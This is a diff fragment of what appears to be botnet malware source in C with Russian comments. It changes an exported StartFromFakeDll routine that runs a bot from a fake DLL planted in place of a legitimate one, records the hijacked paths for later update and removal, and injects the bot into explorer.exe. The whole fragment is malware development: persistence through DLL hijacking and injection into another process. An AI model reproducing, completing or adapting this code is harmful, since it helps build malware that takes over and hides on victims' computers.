@@ -204,7 +204,6 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 	return TRUE;
 }
 
-
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
 DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
@@ -217,17 +216,30 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 }
 
 // Експортируемая ф-ция для запуска Bot.plug из FakeDll.
-BOOL WINAPI StartFromFakeDll()
+// pathBotPlug - путь в котором находится этот бот
+// pathFakeDll - путь к fake.dll 
+// pathOrigDll - путь к длл которую подменили на fake.dll
+// эти параметры необходимы для удаления и обновления бота
+BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll )
 {
 //	BOT::Initialize();
-	DLLDBG("StartFromFakeDll", "Started.");
+	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );
 
 	// Смотрим на то - запущен ли бот
 	HANDLE BotInstanceMutex = BOT::TryCreateBotInstance();
+	
+	m_lstrcpy( BOT::FakeDllPathBot, pathBotPlug );
+	m_lstrcpy( BOT::FakeDllPathDll, pathFakeDll );
+	m_lstrcpy( BOT::FakeDllPathOrigDll, pathOrigDll );
 
 	DLLDBG("StartFromFakeDll", "BOT::TryCreateBotInstance() result=0x%X", BotInstanceMutex);
 	if (BotInstanceMutex == NULL) return FALSE;
 	pCloseHandle(BotInstanceMutex); //закрываем мютекс, чтобы его снова создали в процессе explorer.exe
 
 	return (InjectIntoExplorer(ExplorerEntryPointFromFakeDll) ? TRUE : FALSE);
+}
+
+bool FakeDllDelete()
+{
+	return true;
 }
